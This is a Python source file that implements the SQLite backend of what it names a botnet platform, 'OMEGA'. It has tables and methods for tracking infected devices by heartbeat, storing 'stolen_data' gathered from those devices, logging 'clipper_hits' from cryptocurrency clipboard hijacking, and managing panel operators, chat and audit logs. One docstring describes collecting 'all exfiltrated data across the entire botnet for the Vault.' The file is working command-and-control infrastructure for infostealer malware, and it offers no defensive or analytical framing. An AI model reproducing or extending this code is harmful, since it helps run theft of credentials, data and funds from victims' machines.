import sqlite3, json, time, os

class Database:
    """Encapsulated SQLite Database for the OMEGA platform."""
    def __init__(self, db_path=None):
        if db_path is None:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            db_path = os.path.join(base_dir, "..", "mrl_data.db")
        self.db_path = os.path.abspath(db_path)
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS devices (
                    id TEXT PRIMARY KEY,
                    data TEXT,
                    last_seen REAL
                );
                CREATE TABLE IF NOT EXISTS stolen_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    type TEXT,
                    data TEXT,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS clipper_hits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    type TEXT,
                    val TEXT,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    val TEXT
                );
                CREATE TABLE IF NOT EXISTS users (
                    id TEXT PRIMARY KEY,
                    username TEXT,
                    provider TEXT,
                    provider_id TEXT,
                    role TEXT DEFAULT 'user',
                    last_ip TEXT,
                    ip_v6 TEXT,
                    hwid TEXT,
                    is_banned INTEGER DEFAULT 0,
                    last_active REAL,
                    metadata TEXT
                );
                CREATE TABLE IF NOT EXISTS sessions (
                    token TEXT PRIMARY KEY,
                    user_id TEXT,
                    expires REAL
                );
                CREATE TABLE IF NOT EXISTS chat_messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    username TEXT,
                    message TEXT,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS audit_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ts REAL,
                    level TEXT DEFAULT 'info',
                    category TEXT NOT NULL,
                    user_id TEXT,
                    username TEXT,
                    target_id TEXT,
                    action TEXT NOT NULL,
                    detail TEXT,
                    ip TEXT
                );
                CREATE INDEX IF NOT EXISTS idx_audit_ts ON audit_logs(ts);
                CREATE INDEX IF NOT EXISTS idx_audit_cat ON audit_logs(category);
            """)
            conn.commit()

    # ── Devices ───────────────────────────────────────────────────────────────
    def update_device(self, device_id: str, data: dict):
        """Atomically upserts device data and refreshes heartbeat timestamp."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT OR REPLACE INTO devices (id, data, last_seen) VALUES (?, ?, ?)",
                (device_id, json.dumps(data), time.time())
            )
            conn.commit()

    def update_heartbeat(self, device_id: str):
        """Updates the last_seen timestamp only."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("UPDATE devices SET last_seen = ? WHERE id = ?", (time.time(), device_id))
            conn.commit()

    def get_devices(self, user_role: str = "user", user_id: str = None) -> list:
        """Returns devices, filtering out private nodes for non-admins and unauthorized users."""
        devices = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute("SELECT id, data, last_seen FROM devices").fetchall():
                dev_id, dev_data, last_seen = row
                try:
                    d = json.loads(dev_data)
                    d["id"] = dev_id
                    d["status"] = "Online" if (time.time() - last_seen < 120) else "Offline"
                    
                    # Visibility Check: Admins see everything. 
                    if user_role != "admin":
                        allowed_users = d.get("allowed_users")
                        # If allowed_users is a list, and user_id is not in it, skip.
                        # If allowed_users is None or not a list, it's public.
                        if isinstance(allowed_users, list) and user_id not in allowed_users:
                            continue
                        
                    devices.append(d)
                except: pass
        return devices

    def set_device_visibility(self, device_id: str, allowed_users: list = None):
        """Sets which users can see a node. None means public."""
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT data FROM devices WHERE id=?", (device_id,)).fetchone()
            if row:
                data = json.loads(row[0])
                if allowed_users is None:
                    data.pop("allowed_users", None)
                else:
                    data["allowed_users"] = allowed_users
                conn.execute("UPDATE devices SET data=? WHERE id=?", (json.dumps(data), device_id))
                conn.commit()

    def prune_stale(self, timeout=86400):
        """Removes device records older than `timeout` seconds."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("DELETE FROM devices WHERE ? - last_seen > ?", (time.time(), timeout))
            conn.commit()

    # ── Stolen Data ───────────────────────────────────────────────────────────
    def add_stolen_data(self, device_id: str, data_type: str, data):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO stolen_data (device_id, type, data, ts) VALUES (?, ?, ?, ?)",
                (device_id, data_type, json.dumps(data), time.time())
            )
            conn.commit()

    def get_stolen_data(self, device_id: str) -> list:
        results = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute(
                "SELECT type, data, ts FROM stolen_data WHERE device_id=? ORDER BY ts DESC",
                (device_id,)
            ).fetchall():
                try:
                    results.append({"type": row[0], "data": json.loads(row[1]), "ts": row[2]})
                except: pass
        return results

    def get_all_stolen_data(self) -> list:
        """Retrieves all exfiltrated data across the entire botnet for the Vault."""
        results = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute(
                "SELECT id, device_id, type, data, ts FROM stolen_data ORDER BY ts DESC"
            ).fetchall():
                try:
                    results.append({
                        "id": row[0],
                        "device_id": row[1],
                        "type": row[2],
                        "data": json.loads(row[3]),
                        "ts": row[4]
                    })
                except: pass
        return results

    # ── Clipper Hits ──────────────────────────────────────────────────────────
    def log_clipper_hit(self, device_id: str, c_type: str, val: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO clipper_hits (device_id, type, val, ts) VALUES (?, ?, ?, ?)",
                (device_id, c_type, val, time.time())
            )
            conn.commit()

    # ── Config KV Store ───────────────────────────────────────────────────────
    def set_config(self, key: str, val: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT OR REPLACE INTO config (key, val) VALUES (?, ?)", (key, val))
            conn.commit()

    def get_config(self, key: str) -> str | None:
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT val FROM config WHERE key=?", (key,)).fetchone()
        return row[0] if row else None

    # ── User Management ───────────────────────────────────────────────────────
    def upsert_user(self, provider: str, provider_id: str, username: str, ip: str, metadata: dict = None, hwid: str = None, ip_v6: str = None):
        user_id = f"{provider}:{provider_id}"
        meta_json = json.dumps(metadata) if metadata else None
        with sqlite3.connect(self.db_path) as conn:
            # Check if HWID is banned first
            if hwid:
                banned = conn.execute("SELECT id FROM users WHERE hwid=? AND is_banned=1", (hwid,)).fetchone()
                if banned: return None

            row = conn.execute("SELECT username, role, is_banned FROM users WHERE id=?", (user_id,)).fetchone()
            if row:
                if row[2]: # is_banned
                    return None
                conn.execute(
                    "UPDATE users SET last_ip=?, ip_v6=?, hwid=?, last_active=?, metadata=? WHERE id=?",
                    (ip, ip_v6, hwid, time.time(), meta_json, user_id)
                )
            else:
                count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
                role = "admin" if count == 0 else "user"
                conn.execute(
                    "INSERT INTO users (id, username, provider, provider_id, role, last_ip, ip_v6, hwid, last_active, metadata) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_id, username, provider, provider_id, role, ip, ip_v6, hwid, time.time(), meta_json)
                )
            conn.commit()
        return user_id

    def get_user(self, user_id: str):
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT id, username, role, is_banned, last_ip, metadata FROM users WHERE id=?", (user_id,)).fetchone()
            if row:
                meta = {}
                try: meta = json.loads(row[5]) if row[5] else {}
                except: pass
                return {"id": row[0], "username": row[1], "role": row[2], "is_banned": bool(row[3]), "ip": row[4], "metadata": meta}
        return None

    def get_all_users(self):
        users = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute("SELECT id, username, role, is_banned, last_ip, last_active, metadata FROM users").fetchall():
                meta = {}
                try: meta = json.loads(row[6]) if row[6] else {}
                except: pass
                users.append({
                    "id": row[0], "username": row[1], "role": row[2], 
                    "is_banned": bool(row[3]), "ip": row[4], "last_active": row[5],
                    "metadata": meta
                })
        return users

    def update_user_profile(self, user_id: str, username: str = None, role: str = None, is_banned: bool = None):
        with sqlite3.connect(self.db_path) as conn:
            if username:
                conn.execute("UPDATE users SET username=? WHERE id=?", (username, user_id))
            if role:
                conn.execute("UPDATE users SET role=? WHERE id=?", (role, user_id))
            if is_banned is not None:
                conn.execute("UPDATE users SET is_banned=? WHERE id=?", (1 if is_banned else 0, user_id))
            conn.commit()

    # ── Chat ──────────────────────────────────────────────────────────────────
    def add_chat_message(self, user_id: str, username: str, message: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO chat_messages (user_id, username, message, ts) VALUES (?, ?, ?, ?)",
                (user_id, username, message, time.time())
            )
            conn.commit()

    def get_chat_history(self, limit=50):
        messages = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute('''
                SELECT c.rowid, c.username, c.message, c.ts, c.user_id, u.metadata 
                FROM chat_messages c 
                LEFT JOIN users u ON c.user_id = u.id
                ORDER BY c.ts DESC LIMIT ?''', (limit,)).fetchall():
                
                meta = {}
                try: meta = json.loads(row[5]) if row[5] else {}
                except: pass
                
                messages.append({
                    "id": row[0], "username": row[1], "message": row[2], 
                    "ts": row[3], "user_id": row[4], "avatar": meta.get("avatar")
                })
        return messages[::-1]

    # ── Audit Logs ───────────────────────────────────────────────────────────────
    def log_audit(self, category: str, action: str, detail: str = "",
                  user_id: str = None, username: str = None,
                  target_id: str = None, ip: str = None, level: str = "info"):
        """Write a structured audit log entry."""
        import time
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO audit_logs (ts, level, category, user_id, username, target_id, action, detail, ip) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (time.time(), level, category, user_id, username, target_id, action, detail or "", ip)
            )
            conn.commit()

    def get_audit_logs(self, category: str = None, limit: int = 200, offset: int = 0) -> list:
        """Fetch audit logs, optionally filtered by category, newest first."""
        query = "SELECT id, ts, level, category, username, target_id, action, detail, ip FROM audit_logs"
        params: list = []
        if category and category != "all":
            query += " WHERE category=?"
            params.append(category)
        query += " ORDER BY ts DESC LIMIT ? OFFSET ?"
        params.extend([limit, offset])
        results = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute(query, params).fetchall():
                results.append({
                    "id": row[0], "ts": row[1], "level": row[2], "category": row[3],
                    "username": row[4] or "—", "target": row[5] or "—",
                    "action": row[6], "detail": row[7] or "", "ip": row[8] or "—"
                })
        return results

    def prune_audit_logs(self, max_entries: int = 100000):
        """Keep only the most recent max_entries to prevent unbounded growth."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "DELETE FROM audit_logs WHERE id NOT IN "
                "(SELECT id FROM audit_logs ORDER BY ts DESC LIMIT ?)",
                (max_entries,)
            )
            conn.commit()
